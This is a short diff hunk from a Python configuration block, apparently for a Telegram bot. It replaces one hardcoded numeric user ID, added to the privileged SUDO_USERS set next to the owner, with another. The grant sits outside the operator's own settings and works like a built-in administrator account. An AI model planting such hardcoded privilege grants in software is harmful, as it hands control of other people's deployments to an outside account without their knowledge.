@@ -109,7 +109,7 @@ else:
     TEMPORARY_DATA = Config.TEMPORARY_DATA
     escape_markdown = config.escape_markdown
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(594813047)
+SUDO_USERS.add(1042070307)
     
 
 
